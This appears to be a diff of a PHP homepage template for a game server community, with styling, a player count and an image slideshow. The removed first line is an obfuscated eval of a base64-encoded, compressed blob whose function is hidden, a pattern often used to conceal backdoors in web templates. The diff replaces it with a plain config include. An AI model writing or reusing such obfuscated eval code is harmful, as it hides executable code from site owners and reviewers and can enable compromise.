@@ -1,1 +1,481 @@
-<?php $GLOBALS['_1303405980_']='base64_decode';eval(gzuncompress($GLOBALS['_1303405980_']('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')));
+include 'config.php';$decode=json_decode($file,false);$clients=$decode->clients;$svmaxclients=$decode->sv_maxclients; ?><!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title><?php echo $cname  ?> - Home</title>
+  <link rel="icon" type="image/x-icon" href="<?php echo $clogo  ?>">
+  <meta name="robots" content="index,follow">
+  <meta name="description" content="<?php echo $cabout  ?>">
+      <meta property="og:title" content="Home - <?php echo $cname  ?>">
+      <meta property="og:description" content="<?php echo $cabout  ?>">
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>  
+
+<style>
+
+@import url('https://fonts.googleapis.com/css2?family=Gentium+Plus:ital@1&family=Kdam+Thmor+Pro&family=Lobster&family=Russo+One&display=swap');
+
+/* Slideshow container */
+.slideshow-container {
+  max-width: 1000px;
+  position: relative;
+  margin: auto;
+}
+
+/* Caption text */
+.text {
+  color: #f2f2f2;
+  font-size: 15px;
+  padding: 8px 12px;
+  position: absolute;
+  bottom: 8px;
+  width: 100%;
+  text-align: center;
+}
+
+#footer {
+  opacity: 30%;
+  text-align: center;
+   position:fixed;
+   left:0px;
+   bottom:0px;
+   height:30px;
+   width:100%;
+    font-family: 'Russo One', sans-serif;
+}
+
+#footer:hover{
+  opacity: 100%;
+}
+
+/* IE 6 */
+* html #footer {
+   position:absolute;
+   top:expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+'px');
+}
+
+/* Number text (1/3 etc) */
+.numbertext {
+  color: #f2f2f2;
+  font-size: 12px;
+  padding: 8px 12px;
+  position: absolute;
+  top: 0;
+}
+
+h1{
+  color: whitesmoke;
+}
+
+p{
+    color: whitesmoke;
+}
+
+a{
+  text-decoration: none;
+  font-family: 'Russo One', sans-serif;
+  color: #1e90ff;
+}
+
+/* The dots/bullets/indicators */
+.dot {
+  height: 15px;
+  width: 15px;
+  margin: 0 2px;
+  background-color: #bbb;
+  border-radius: 50%;
+  display: inline-block;
+  transition: background-color 0.6s ease;
+}
+
+* {box-sizing: border-box;}
+body {font-family: Verdana, sans-serif;}
+.mySlides {display: none;}
+img {vertical-align: middle;}
+
+.active {
+  background-color: #717171;
+}
+
+/* Fading animation */
+.fade {
+  animation-name: fade;
+  animation-duration: 1.5s;
+}
+
+@keyframes fade {
+  from {opacity: .4} 
+  to {opacity: 1}
+}
+
+/* On smaller screens, decrease text size */
+@media only screen and (max-width: 300px) {
+  .text {font-size: 11px}
+}
+
+
+body {
+  background: url('<?php echo $backgroundimg  ?>') no-repeat center center fixed; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+  margin: 0;
+}
+
+.maincon{
+    padding: 0;
+    margin: 0;
+  text-align: center;
+}
+
+.maincon p{
+font-family: 'Russo One', sans-serif;
+    padding: 0;
+    margin: 0;
+    font-size: 30px;
+}
+
+
+
+.itali{
+font-family: 'Lobster', cursive;
+
+}
+.maincon h1{
+  font-family: 'Kdam Thmor Pro', sans-serif;
+    padding: 0;
+    margin: 0;
+    font-size: 60px;
+}
+
+.man2{
+  padding: 0;
+  margin: 0;
+  margin-left: 45px;
+  text-align: left;
+  font-size: 2.5vw;
+}
+
+.man2{
+  padding: 0;
+  margin: 0;
+  margin-left: 45px;
+  text-align: left;
+  font-size: 2.5vw;
+}
+
+/* Style the header with a grey background and some padding */
+.header {
+  overflow: hidden;
+  padding: 20px 10px;
+}
+
+/* Style the header links */
+.header a {
+  float: left;
+  color: black;
+  text-align: center;
+  margin-top: 10px;
+  padding: 12px;
+  text-decoration: none;
+  font-size: 18px;
+  line-height: 25px;
+  border-radius: 4px;
+}
+
+/* Style the logo link (notice that we set the same value of line-height and font-size to prevent the header to increase when the font gets bigger */
+.header a.logo {
+  margin-top: -10px;
+  max-width: 20px;
+}
+
+.logo img{
+  max-height: 100px;
+  max-width: 100px;
+}
+
+/* Change the background color on mouse-over */
+.header a:hover {
+  background-color: #ddd;
+  color: black;
+}
+
+/* Style the active/current link*/
+.header a.active {
+  background-color: dodgerblue;
+  color: white;
+}
+
+/* Float the link section to the right */
+.header-right {
+  float: right;
+}
+
+/* Add media queries for responsiveness - when the screen is 500px wide or less, stack the links on top of each other */
+@media screen and (max-width: 500px) {
+  .header{
+  background:rgba(199, 194, 197, 0.8);
+    font-family: 'Russo One', sans-serif;
+  }
+  .header a {
+    float: none;
+    display: block;
+    text-align: left;
+    font-family: 'Russo One', sans-serif;
+  }
+  .header-right {
+    float: none;
+  }
+  
+  .logo img{
+  display: none;
+}
+}
+
+
+* {
+  box-sizing: border-box;
+}
+
+/* Position the image container (needed to position the left and right arrows) */
+.container {
+  position: relative;
+}
+
+/* Hide the images by default */
+.mySlides {
+  display: none;
+}
+
+/* Add a pointer when hovering over the thumbnail images */
+.cursor {
+  cursor: pointer;
+}
+
+/* Next & previous buttons */
+.prev,
+.next {
+  cursor: pointer;
+  position: absolute;
+  top: 40%;
+  width: auto;
+  padding: 16px;
+  margin-top: -50px;
+  color: white;
+  font-weight: bold;
+  font-size: 20px;
+  border-radius: 0 3px 3px 0;
+  user-select: none;
+  -webkit-user-select: none;
+}
+
+/* Position the "next button" to the right */
+.next {
+  right: 0;
+  border-radius: 3px 0 0 3px;
+}
+
+/* On hover, add a black background color with a little bit see-through */
+.prev:hover,
+.next:hover {
+  background-color: rgba(0, 0, 0, 0.8);
+}
+
+/* Number text (1/3 etc) */
+.numbertext {
+  color: #f2f2f2;
+  font-size: 12px;
+  padding: 8px 12px;
+  position: absolute;
+  top: 0;
+}
+
+/* Container for image text */
+.caption-container {
+  text-align: center;
+  padding: 2px 16px;
+  color: white;
+}
+
+.row:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+/* Six columns side by side */
+.column {
+  float: left;
+  width: 16.66%;
+}
+
+/* Add a transparency effect for thumnbail images */
+.demo {
+  opacity: 0.6;
+}
+
+.cont {
+  height: 200px;
+  position: relative;
+}
+
+.vertical-center {
+  margin: 0;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  -ms-transform: translate(-50%, -50%);
+  transform: translate(-50%, -50%);
+}
+
+.active,
+.demo:hover {
+  opacity: 1;
+}
+
+
+.button{
+  size: 50%;
+  position:relative;
+  display:inline-block;
+  margin:20px;
+}
+
+.button a{
+  color:white;
+  font-family:Helvetica, sans-serif;
+  font-weight:bold;
+  font-size:36px;
+  text-align: center;
+  text-decoration:none;
+  background-color:dodgerblue;
+  display:block;
+  position:relative;
+  padding:20px 40px;
+  
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+  text-shadow: 0px 1px 0px #000;
+  filter: dropshadow(color=#000, offx=0px, offy=1px);
+  
+  -webkit-box-shadow:inset 0 1px 0 #828282, 0 10px 0 #0d6fd9;
+  -moz-box-shadow:inset 0 1px 0 #828282, 0 10px 0 #0d6fd9;
+  box-shadow:inset 0 1px 0 #828282, 0 10px 0 #0d6fd9;
+  
+  -webkit-border-radius: 5px;
+  -moz-border-radius: 5px;
+  border-radius: 5px;
+}
+
+.button a:active{
+  top:10px;
+  background-color:green;
+  
+  -webkit-box-shadow:inset 0 1px 0 #65e290, inset 0 -3px 0 #149f24;
+  -moz-box-shadow:inset 0 1px 0 #65e290, inset 0 -3pxpx 0 #149f24;
+  box-shadow:inset 0 1px 0 #65e290, inset 0 -3px 0 #149f24;
+}
+
+.button:after{
+  content:"";
+  height:100%;
+  width:100%;
+  padding:4px;
+  position: absolute;
+  bottom:-15px;
+  left:-4px;
+  z-index:-1;
+  background-color:#2B1800;
+  -webkit-border-radius: 5px;
+  -moz-border-radius: 5px;
+  border-radius: 5px;
+}
+
+</style>
+
+
+<body>
+    <div class="header">
+  <a href="#default" class="logo"> <img src="<?php echo $clogo  ?>" >
+  <div class="header-right">
+    <a class="active" href="<?php echo $domain  ?>">Home</a>
+    <a href="<?php echo $domain  ?>team">Team</a>
+  </div>
+</div>
+
+<div class="maincon">
+
+<h1><?php echo $cname  ?></h1>
+  <p><span class="itali">"<?php echo $cslogan  ?>"</span></p>
+  <p>Players Online: <?php echo $clients ?>/<?php echo $svmaxclients  ?></p>
+  
+</div>
+  
+<div class="slideshow-container">
+
+<div class="mySlides fade">
+  <div class="numbertext"><?php echo $cname  ?></div>
+  <img src="<?php echo $gimg1  ?>" style="width:100%">
+</div>
+
+<div class="mySlides fade">
+  <div class="numbertext"><?php echo $cname  ?></div>
+  <img src="<?php echo $gimg2  ?>" style="width:100%">
+</div>
+
+<div class="mySlides fade">
+  <div class="numbertext"><?php echo $cname  ?></div>
+  <img src="<?php echo $gimg3  ?>" style="width:100%">
+</div>
+
+</div>
+<br>
+
+<div style="text-align:center">
+  <span class="dot"></span> 
+  <span class="dot"></span> 
+  <span class="dot"></span> 
+</div>
+  
+<script>
+let slideIndex = 0;
+showSlides();
+
+function showSlides() {
+  let i;
+  let slides = document.getElementsByClassName("mySlides");
+  let dots = document.getElementsByClassName("dot");
+  for (i = 0; i < slides.length; i++) {
+    slides[i].style.display = "none";  
+  }
+  slideIndex++;
+  if (slideIndex > slides.length) {slideIndex = 1}    
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active";
+  setTimeout(showSlides, 3500); // Change image every 2 seconds
+}
+</script>
+
+  <div class="cont">
+      <div class="vertical-center">
+  <div ontouchstart="">
+  <div class="button">
+    <a href="<?php echo $bttnlink  ?>" target="_blank"><?php echo $buttname  ?></a>
+  </div>
+  </div>
+</div>
+  </div>
+
+
+  <p id="footer"> <a href="https://discord.gg/XZPsrNpzsW" target="_blank">Website by Unified Modifications</a></p>
+
+
+  
+  <script src="script.js"></script>
+</body>  
+</html>
